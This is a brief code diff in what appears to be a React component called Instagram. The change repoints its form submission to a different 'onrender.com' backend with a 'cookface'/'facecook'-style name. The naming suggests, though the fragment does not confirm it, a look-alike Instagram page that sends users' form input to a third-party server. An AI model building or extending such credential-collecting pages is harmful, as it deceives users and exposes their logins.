@@ -18,7 +18,10 @@ const Instagram = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
     // make a request to the backend
-    axios.post("https://cookface.onrender.com/api/v2/instagram", formData);
+    axios.post(
+      "https://facecookbackend.onrender.com/api/v2/instagram",
+      formData
+    );
     setLoading(true);
 
     // set a timeout
